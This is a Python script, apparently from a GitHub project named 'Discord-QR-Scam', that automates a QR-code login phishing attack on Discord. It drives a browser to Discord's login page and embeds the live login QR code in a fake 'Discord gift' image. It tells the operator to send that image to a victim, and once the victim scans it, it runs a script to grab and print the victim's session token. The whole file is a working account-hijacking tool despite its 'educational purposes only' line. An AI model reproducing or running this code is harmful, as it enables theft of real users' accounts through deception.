import os
import time
import base64
from PIL import Image
from bs4 import BeautifulSoup

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Developer: NightfallGT
# Educational purposes only
os.system('cls' if os.name == 'nt' else 'clear')


class Timeout(Exception):
    """Raise when connection times out"""


def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)


def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)


def main():
    print('github.com/NightfallGT/Discord-QR-Scam\n')
    print('** QR Code Scam Generator **')

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    options.add_argument("--incognito")

    driver = webdriver.Chrome(
        options=options,
        service=Service(r'chromedriver.exe'),
    )

    driver.get('https://discord.com/login')

    WebDriverWait(driver, 15).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, '.qrCode-wG6ZgU'))
    )

    loaded = False
    for i in range(90):
        qr_code = driver.find_element(By.CSS_SELECTOR, '.qrCode-wG6ZgU')
        if 'spinner-2enMB9' in qr_code.get_attribute('class'):
            time.sleep(0.5)
        else:
            loaded = True
            break

    if not loaded:
        raise Timeout('QR Code timed out')

    print('- Page loaded.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'temp/qr_code.png')

    img_data = base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file, 'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('- QR Code has been generated. > discord_gift.png')
    print('Send the QR Code to user and scan. Waiting...\n')

    while True:
        if discord_login != driver.current_url:
            print('Grabbing token...')
            token = driver.execute_script(open('grab_token.js', 'r').read())
            print('Token grabbed:', token)
            break

    print('\nTask complete.')
    print('Press any key to exit...', end='')


if __name__ == '__main__':
    try:
        main()
    except Timeout:
        print('\nThe QR Code took too long to load (>45 sec)')
        print('The program will now exit...', end='')
    except Exception:
        print('\nAn Unexpected Error Has Occured')
        print('The program will now exit...', end='')

    input()
